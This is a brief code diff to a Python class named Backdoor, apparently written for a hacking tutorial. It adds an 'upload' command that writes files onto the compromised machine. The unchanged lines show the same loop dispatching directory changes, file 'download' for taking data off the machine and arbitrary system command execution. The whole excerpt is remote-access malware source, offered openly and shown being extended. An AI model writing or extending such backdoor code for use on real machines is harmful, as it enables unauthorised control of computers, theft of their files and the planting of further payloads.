@@ -51,6 +51,8 @@ class Backdoor:
                 command_result = self.change_working_directory_to(command[1])
             elif command[0] == "download":
                 command_result = self.read_file(command[1])
+            elif command[0] == "upload":
+                command_result = self.write_file(command[1], command[2])
             else:
                 command_result = self.execute_system_command(command) #specify SELF.function -
                 #need to specify self since calling function from within class
